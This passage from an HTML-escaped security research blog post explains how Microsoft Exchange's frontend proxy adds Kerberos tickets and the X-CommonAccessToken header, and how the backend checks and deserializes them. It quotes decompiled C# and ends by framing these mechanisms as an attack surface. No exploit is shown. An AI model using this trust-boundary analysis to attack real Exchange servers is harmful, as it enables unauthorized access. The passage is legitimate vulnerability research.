class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Exchange will also generate a Kerberos ticket via the HTTP Service-Class of the Backend and put it in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authorization&lt;/code&gt; header. This header is designed to prevent anonymous users from accessing the Backend directly. With the Kerberos Ticket, the Backend could validate the access from the Frontend.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\ProxyRequestHandler.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ProxyKerberosAuthentication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;serverRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConnectionGroupName&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserHostAddress&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GccUtils&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetClientPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharedHttpContextWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AuthBehavior&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AuthState&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AuthState&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BackEndFullAuth&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;ShouldBackendRequestBeAnonymous&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpProxySettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TestBackEndSupportEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsNullOrEmpty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TestBackEndUrl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;serverRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConnectionGroupName&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Unauthenticated&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;serverRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Authorization&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KerberosUtilities&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GenerateKerberosAuthHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;serverRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TraceContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kerberosChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\KerberosUtilities.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GenerateKerberosAuthHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;traceContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AuthenticationContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authenticationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kerberosChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;authenticationContext&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AuthenticationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;HTTP/&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;authenticationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;InitializeForOutboundNegotiate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AuthenticationMechanism&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Kerberos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SecurityStatus&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;securityStatus&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authenticationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;NegotiateSecurityContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;@string&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Negotiate &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;@string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Therefore, a Client request proxied to the Backend will be added with several HTTP Headers for internal use. The two most essential Headers are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt;, which indicates the mail users’ log in identity, and Kerberos Ticket, which represents legal access from the Frontend.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;frontend-response-section&quot;&gt;Frontend Response Section&lt;/h3&gt;

&lt;p&gt;The last is the section of Response. It receives the response from the Backend and decides which headers or cookies are allowed to be sent back to the Frontend.&lt;/p&gt;

&lt;h2 id=&quot;backend-rehydration-module&quot;&gt;Backend Rehydration Module&lt;/h2&gt;

&lt;p&gt;Now let’s move on and check  how the Backend processes the request from the Frontend. The Backend first uses the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IsAuthenticated&lt;/code&gt; to check whether the incoming request is authenticated. Then the Backend will verify whether the request is equipped with an extended right called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ms-Exch-EPI-Token-Serialization&lt;/code&gt;. With the default setting, only Exchange Machine Account would have such authorization. This is also why the Kerberos Ticket generated by the Frontend could pass the checkpoint but you can’t access the Backend directly with a low authorized account.&lt;/p&gt;

&lt;p&gt;After passing the check, Exchange will restore the login identity used in the Frontend, through deserializing the header &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt; back to the original Access Token, and then put it in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;httpContext&lt;/code&gt; object to progress to the business logic in the Backend.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Authentication\BackendRehydrationModule.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnAuthenticateRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EventArgs&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsAuthenticated&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ProcessRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ProcessRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CommonAccessToken&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;TryGetCommonAccessToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;TryGetCommonAccessToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommonAccessToken&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-CommonAccessToken&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsNullOrEmpty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsTokenSerializationAllowed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Identity&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WindowsIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;BEValidateCATRightsLatency&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stopwatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ElapsedMilliseconds&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elapsedMilliseconds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommonAccessToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Item-CommonAccessToken&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;//...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;IsTokenSerializationAllowed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WindowsIdentity&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;windowsIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;flag2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LocalServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;AllowsTokenSerializationBy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientSecurityContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AllowsTokenSerializationBy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientSecurityContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clientContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LocalServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;HasExtendedRightOnServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
        &lt;span class=&quot;n&quot;&gt;WellKnownGuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TokenSerializationRightGuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// ms-Exch-EPI-Token-Serialization&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;the-attack-surface&quot;&gt;The attack surface&lt;/h1&gt;

&lt;p&gt;After a brief introduction to the architecture of CAS, we now realize that CAS is just a well-written HTTP Proxy (or Client), and we know that implementing Proxy isn’t easy.  So I was wondering:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Could I use a single HTTP request to access different contexts in Frontend and Backend respectively to cause some confusion?&lt;/p&gt;
&lt;/blockquote&gt;

